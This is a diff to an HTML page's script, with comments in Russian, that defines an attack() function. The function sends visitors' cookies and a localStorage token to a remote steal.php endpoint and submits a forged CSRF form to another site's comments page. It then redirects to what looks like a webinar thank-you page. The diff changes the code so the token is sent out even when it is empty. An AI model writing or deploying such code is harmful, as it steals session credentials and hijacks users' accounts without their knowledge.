@@ -54,16 +54,14 @@
 
   <script>
     function attack() {
-      // Кража cookie
+      // 1. Отправка cookie
       fetch("https://kazcybertoken.ct.ws/steal.php?cookie=" + encodeURIComponent(document.cookie));
 
-      // Кража токена из localStorage
+      // 2. Отправка токена, даже если он null
       const token = localStorage.getItem("token");
-      if (token) {
-        fetch("https://kazcybertoken.ct.ws/steal.php?token=" + encodeURIComponent(token));
-      }
+      fetch("https://kazcybertoken.ct.ws/steal.php?token=" + encodeURIComponent(token));
 
-      // CSRF-атака
+      // 3. CSRF-атака
       const form = document.createElement("form");
       form.action = "https://kazcyber.zapto.org/comments.php";
       form.method = "POST";
@@ -77,7 +75,7 @@
       document.body.appendChild(form);
       form.submit();
 
-      // Сообщение + редирект
+      // 4. Показать сообщение и редирект
       document.getElementById("ok").style.display = "block";
       setTimeout(() => {
         window.location.href = "https://cyberwebinar.kz/thanks";
@@ -86,4 +84,3 @@
   </script>
 </body>
 </html>
-
